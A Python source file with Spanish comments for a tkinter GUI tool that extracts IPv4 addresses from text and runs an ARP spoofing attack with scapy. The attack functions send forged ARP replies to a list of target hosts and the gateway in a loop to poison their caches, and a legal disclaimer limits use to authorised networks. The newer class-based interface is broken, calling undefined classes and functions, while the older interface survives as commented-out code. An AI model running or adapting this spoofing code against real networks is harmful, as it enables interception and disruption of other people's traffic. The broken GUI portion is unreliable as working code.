"""
Herramienta Combinada: Extracción de IP y ARP Spoofing

ADVERTENCIA LEGAL:
==================
Esta herramienta es SOLO para fines educativos y de prueba en redes propias.
El uso de ARP spoofing en redes sin autorización es ILEGAL y puede resultar
en consecuencias legales graves. El autor no se responsabiliza por el mal uso
de este software.

USO PERMITIDO:
- Pruebas en tu propia red doméstica
- Laboratorios de seguridad con permisos explícitos
- Educación en ciberseguridad
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
from tkinter import scrolledtext
import re
import threading
import time
import uuid
import os
from scapy.all import ARP, Ether, send, srp

# ===============================
# Funcionalidad de Extracción de IP
# ===============================
def extraer_ips(texto):
    """
    Utiliza una expresión regular para extraer todas las direcciones IPv4 del texto.
    """
    patron = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
    return re.findall(patron, texto)

def procesar_texto():
    """
    Toma el contenido del área de texto de entrada, extrae las IPs y las muestra en el área de salida.
    """
    texto = input_text.get("1.0", tk.END)
    ips = extraer_ips(texto)
    output_text.delete("1.0", tk.END)
    if ips:
        output_text.insert(tk.END, "\n".join(ips))
    else:
        output_text.insert(tk.END, "No se encontraron direcciones IP.")

# ===============================
# Funcionalidad de ARP Spoofing
# ===============================
# Variables globales para ARP Spoofing
ip_puerta_enlace = None
mac_atacante = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8*6, 8)][::-1])
ataque_en_curso = False

def obtener_mac(ip):
    """
    Obtiene la dirección MAC de un dispositivo dado su IP mediante un paquete ARP.
    """
    solicitud_arp = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    paquete = ether / solicitud_arp
    resultado = srp(paquete, timeout=2, verbose=0)[0]
    for enviado, recibido in resultado:
        return recibido.hwsrc
    return None

def spoofing_arp(ip_objetivo):
    """
    Ejecuta el ARP spoofing enviando paquetes falsificados al objetivo y a la puerta de enlace.
    """
    global ataque_en_curso
    mac_objetivo = obtener_mac(ip_objetivo)
    if not mac_objetivo:
        widget_salida.insert(tk.END, f"No se pudo obtener la dirección MAC del objetivo {ip_objetivo}.\n")
        widget_salida.see(tk.END)
        return

    widget_salida.insert(tk.END, f"Dirección MAC del objetivo {ip_objetivo}: {mac_objetivo}\n")
    widget_salida.see(tk.END)
    
    try:
        respuesta_arp_objetivo = ARP(pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_puerta_enlace, hwsrc=mac_atacante, op=2)
        respuesta_arp_puerta = ARP(pdst=ip_puerta_enlace, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_objetivo, hwsrc=mac_atacante, op=2)
        while ataque_en_curso:
            send(respuesta_arp_objetivo, verbose=0)
            send(respuesta_arp_puerta, verbose=0)
            widget_salida.insert(tk.END, f"Enviando ARP spoofing a {ip_objetivo}...\n")
            widget_salida.see(tk.END)
            time.sleep(2)
    except Exception as e:
        widget_salida.insert(tk.END, f"Ocurrió un error en {ip_objetivo}: {e}\n")
        widget_salida.see(tk.END)
        restaurar_conexion(ip_objetivo)

def restaurar_conexion(ip_objetivo):
    """
    Intenta restaurar la conexión enviando paquetes ARP correctos al objetivo y a la puerta de enlace.
    """
    mac_objetivo = obtener_mac(ip_objetivo)
    mac_puerta = obtener_mac(ip_puerta_enlace)
    if mac_objetivo and mac_puerta:
        respuesta_arp_objetivo = ARP(pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_puerta_enlace, hwsrc=mac_puerta, op=2)
        respuesta_arp_puerta = ARP(pdst=ip_puerta_enlace, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_objetivo, hwsrc=mac_objetivo, op=2)
        send(respuesta_arp_objetivo, count=5, verbose=0)
        send(respuesta_arp_puerta, count=5, verbose=0)
        widget_salida.insert(tk.END, "Conexión restaurada.\n")
        widget_salida.see(tk.END)
    else:
        widget_salida.insert(tk.END, "No se pudo restaurar la conexión: no se pudieron obtener direcciones MAC.\n")
        widget_salida.see(tk.END)

def iniciar_spoofing():
    """
    Inicia el ataque ARP spoofing leyendo la lista de IPs objetivo y creando un hilo por cada una.
    """
    global ataque_en_curso
    ips_str = entrada_ips.get("1.0", tk.END)
    lista_ips = [ip.strip() for ip in ips_str.splitlines() if ip.strip()]
    if lista_ips:
        widget_salida.delete("1.0", tk.END)
        ataque_en_curso = True  
        for ip in lista_ips:
            hilo = threading.Thread(target=spoofing_arp, args=(ip,), daemon=True)
            hilo.start()

def detener_spoofing():
    """
    Detiene el ataque ARP spoofing.
    """
    global ataque_en_curso
    ataque_en_curso = False  
    widget_salida.insert(tk.END, "Ataque cancelado.\n")
    widget_salida.see(tk.END)  

def obtener_puerta_enlace():
    """
    Obtiene la IP de la puerta de enlace por defecto.
    """
    gateway = os.popen("ip route | grep default | awk '{print $3}'").read().strip()
    return gateway

# Creación de la Interfaz Gráfica

class AplicacionPrincipal:
    """
    Ventana principal de la aplicacion.
    """

    def __init__(self, root):
        """
        Inicializa la ventana principal.
        """
        self.root = root
        self.root.title("Herramienta de Red: ARP Spoofing")
        self.root.geometry("1280x720")

        # Muestra la advertencia del inicio
        self._mostrar_advertencia_inicial()

        # Grid de la aplicacion
        self.root.columnconfigure(0, weight=1)
        self.root.columnconfigure(1, weight=1)
        self.root.rowconfigure(0, weight=1)
        
        # Crear frame
        self._crear_frame_extractor()
        
        self.arp_manager = ARPManager(self.arp_output)

    def _mostrar_advertencia_inicial(self):
        """
        Muestra una advertencia antes de mostrar la aplicacion completa
        """
        messagebox.showwarning(
            "ADVERTENCIA",
            "Esta herramienta es solo para fines educativos.\n\n",
            "El uso de ARP spoofing sin autorización es ILEGAL.\n"
            "Solo úsala en redes propias o con permiso explícito.\n\n"
            "El autor no se responsabiliza por el uso indebido."
        )
        
    def _crear_frame_extractor(self):
        """
        Crea el panel de extraccion de las IPs
        """
        frame = ttk.LabelFrame(
            self.root,
            text="Extractor de direcciones IP",
            padding="10"
        )
        
        frame.grid(row=0, column=0, sticky=(tk.N,tk.S,tk.E,tk.W), padx=5, pady=5)
        
        ttk.Label(frame, text="Pega aqui tu texto: ").pack(anchor=tk.W)
        self.input_text = scrolledtext.ScrolledText(frame, width=50, height=15)
        self.input_text.pack(pady=5, fill=tk.BOTH, expand=True)
        
        # Boton
        ttk.Button(
            frame,
            text="Extraer IPs",
            command=self._procesar_extracccion
        ).pack(pady=5)
        
    def _procesar_extracccion(self):
        """
        Del texto dado extrae las IPs
        """
        texto = self.input_text.get("1.0", tk.END)
        ips = extraer_ips(texto)
        
        self.output_text.delete("1.0", tk.END)
        
        if (ips):
            self.output_text.insert(tk.END, f"Se encontraron {len(ips)} IPS: \n\n")
            self.output_text.insert(tk.END, "\n".join(ips))
        else:
            self.output_text.insert(tk.END, "No se encontraron IPs validas")
            
    def _iniciar_arp(self):
        """
        Inicia el ataque
        """
        texto_ips = self.arp_input.get("1.0", tk.END)
        lista_ips = [ip.strip() for ip in texto_ips.splitlines() if (ip.strip())]
        
        # Validar las ips
        ips_validas = [ip for ip in lista_ips if validar_ip(ip)]
        ips_invalidas = set(lista_ips) - set(ips_validas)
        
        
        if (ips_invalidas):
            messagebox.showwarning(
                "IPs Invalidas",
                f"Se ignoraran estas IPs: \n: {', '.join(ips_invalidas)}"
            )
            
        if (ips_validas):
            self._arp_manager.iniciar_ataque(ips_validas)
        else:
            messagebox.showerror(
                "Error",
                f"No hay IPs validas para atacar"
            )
    
    def _detener_arp (self):
        """
        Detiene el ataque ARP
        """
        self.arp_manager.detener_ataque()
            

# root = tk.Tk()
# root.title("Herramienta Combinada: Extracción de IP y ARP Spoofing")

# # Configurar la grilla principal para que tenga dos columnas (izquierda y derecha)
# root.columnconfigure(0, weight=1)
# root.columnconfigure(1, weight=1)
# root.rowconfigure(0, weight=1)

# # Frame Izquierdo: Extracción de IP
# frame_left = ttk.Frame(root, padding="10")
# frame_left.grid(row=0, column=0, sticky=(tk.N, tk.S, tk.E, tk.W))

# label_input = ttk.Label(frame_left, text="Ingresa o pega los datos:")
# label_input.grid(row=0, column=0, sticky=tk.W)

# input_text = scrolledtext.ScrolledText(frame_left, width=50, height=15)
# input_text.grid(row=1, column=0, pady=5)

# button_extract = ttk.Button(frame_left, text="Extraer IPs", command=procesar_texto)
# button_extract.grid(row=2, column=0, pady=5)

# label_output = ttk.Label(frame_left, text="Direcciones IP extraídas:")
# label_output.grid(row=3, column=0, sticky=tk.W)

# output_text = scrolledtext.ScrolledText(frame_left, width=50, height=15)
# output_text.grid(row=4, column=0, pady=5)

# # Frame Derecho: ARP Spoofing
# frame_right = ttk.Frame(root, padding="10")
# frame_right.grid(row=0, column=1, sticky=(tk.N, tk.S, tk.E, tk.W))

# label_ips_objetivo = ttk.Label(frame_right, text="Ingrese la lista de IP objetivo (una por línea):")
# label_ips_objetivo.grid(row=0, column=0, sticky=tk.W)

# entrada_ips = tk.Text(frame_right, width=30, height=10)
# entrada_ips.grid(row=1, column=0, pady=5)

# button_iniciar = ttk.Button(frame_right, text="Iniciar ARP Spoofing", command=iniciar_spoofing)
# button_iniciar.grid(row=2, column=0, pady=5)

# button_detener = ttk.Button(frame_right, text="Cancelar ARP Spoofing", command=detener_spoofing)
# button_detener.grid(row=3, column=0, pady=5)

# widget_salida = scrolledtext.ScrolledText(frame_right, width=50, height=15)
# widget_salida.grid(row=4, column=0, pady=5)

# # Inicializar la puerta de enlace automáticamente
# ip_puerta_enlace = obtener_puerta_enlace()

# root.mainloop()
